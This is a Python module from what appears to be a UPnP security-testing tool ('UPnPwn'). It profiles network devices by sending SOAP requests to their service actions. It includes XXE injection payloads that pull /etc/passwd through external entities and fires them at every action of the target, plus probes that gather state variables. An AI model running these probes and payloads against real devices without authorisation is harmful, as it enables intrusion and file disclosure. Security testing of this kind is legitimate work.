"""This module profiles devices, gathers statistics and is slightly malicious."""

from termcolor import colored
from SOAP_Handler import SOAPHandler


class UPnPwn_Profiler:
    def __init__(self, target_device):
        self.device = target_device

    def print_All_State_Variables(self):
        for service in self.device.service_list:
            if service.num_actions > 0:
                service.state_variable_table.print_State_Variables()

    def profile_Null_Actions(self):
        total_Actions_Profiled = 0
        dont_drop_it = SOAPHandler(self.device.address)
        output_Profile = ""
        for service in self.device.service_list:
            if service.num_actions > 0:
                output_Profile += "        Service: " + service.name + "\n"
                for action in service.actions:
                    action.check_Requires_Input()
                    if action.requires_Input:
                        print("        Now profiling " + action.name + " in service " + service.name + ".")
                        dont_drop_it.handle_clean_soap(self.device, action, service, 0, 0, 1)
                        total_Actions_Profiled += 1
                for variable in service.state_variable_table.variables:
                    if variable.is_filled:
                        output_Profile += "        " + variable.name + ": " + str(variable.value) + "\n"
                output_Profile += "\n"
        print(colored(output_Profile, "green"))
        print("        Conducted ", total_Actions_Profiled, " tests in total.")

    def profile_xxe(self):
        self.profile_xxe_file_retrieval()
        self.profile_xxe_ssrf()

    def profile_xxe_file_retrieval(self):
        total_Actions_Profiled = 0
        dont_drop_it = SOAPHandler(self.device.address)
        output_Profile = ""

        injection_template_list = [
            """<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n""",
            """<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n""",
        ]

        injection_reference_list = [
            "`&xxe`;",
            "&xxe;"
        ]

        for service in self.device.service_list:
            if service.num_actions > 0:
                output_Profile += "        Service: " + service.name + "\n"
                for action in service.actions:
                    print("        Now profiling " + action.name + " in service " + service.name + ".")
                    for injection_template in injection_template_list:
                        for injection_reference in injection_reference_list:
                            dont_drop_it.handle_xxe_soap(self.device, action, service, injection_template, injection_reference)
                            total_Actions_Profiled += 1
                for variable in service.state_variable_table.variables:
                    if variable.is_filled:
                        output_Profile += "        " + variable.name + ": " + str(variable.value) + "\n"
                output_Profile += "\n"
        print(colored(output_Profile, "green"))
        print("        Conducted ", total_Actions_Profiled, " tests in total.")


    def profile_xxe_ssrf(self):
        pass

    def profile_Mute_Actions(self):
        total_Actions_Profiled = 0
        total_Successes = 0
        dont_drop_it = SOAPHandler(self.device.address)
        output_Profile = ""
        for service in self.device.service_list:
            if service.num_actions > 0:
                output_Profile += "        >>> Service: " + service.name + "\n"
                for action in service.actions:
                    action.check_Requires_Input()
                    if not action.requires_Input:
                        print("        Now profiling " + action.name + " in service " + service.name + ".")
                        dont_drop_it.handle_clean_soap(self.device, action, service, 0, 0, 0)
                        total_Actions_Profiled += 1
                for variable in service.state_variable_table.variables:
                    if variable.is_filled:
                        output_Profile += "        " + variable.name + ": " + str(variable.value) + "\n"
                        total_Successes += 1
                output_Profile += "\n"
        print(colored(output_Profile, "green"))
        print("        Conducted ",
              total_Actions_Profiled,
              " tests in total, " +
              str(total_Successes) + " state variables gathered."
              )
